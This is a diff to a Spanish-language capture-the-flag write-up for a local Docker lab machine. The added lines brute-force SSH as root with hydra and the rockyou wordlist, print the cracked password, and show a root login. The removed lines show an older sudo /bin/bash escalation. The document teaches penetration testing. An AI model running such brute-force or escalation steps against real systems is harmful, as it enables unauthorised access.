@@ -59,28 +59,39 @@ Luego examinamos los metadatos de la imagen y conseguimos dar con un nombre de u
 Ahora, con el nombre de usuario podemos hacer fuerza bruta contra el servicio SSH con `hydra`.
 
 ```
-> hydra 
+> hydra -l root -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-08 12:54:29
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: root   password: estrella
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-08 12:54:31 
 ```
 
-Conseguimos acceder al sistema mediante SSH.
-
-# Foothold
-
-Una vez dentro investigamos los comandos que podemos ejecutar con permisos `sudo`.
+Conseguimos acceder al sistema mediante SSH directament con el usuario ``root`` y todos los privilegios del sistema.
 
 ```
-borazuwarah@7dd5484e294a:~$ sudo -l
-Matching Defaults entries for borazuwarah on 7dd5484e294a:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+> ssh root@172.17.0.2
 
-User borazuwarah may run the following commands on 7dd5484e294a:
-    (ALL : ALL) ALL
-    (ALL) NOPASSWD: /bin/bash
-```
+The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
+ED25519 key fingerprint is SHA256:U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
+root@172.17.0.2's password:
 
-Nos encontramos que podemos ejecutar el binario`/bin/bash` con permisos ``sudo`` y sin contraseña.
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
 
-```
-borazuwarah@7dd5484e294a:~$ sudo /bin/bash
-root@7dd5484e294a:/home/borazuwarah#
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@347cd6f2e506:~# ls
+root@347cd6f2e506:~# whoami
+root
+root@347cd6f2e506:~#
 ```
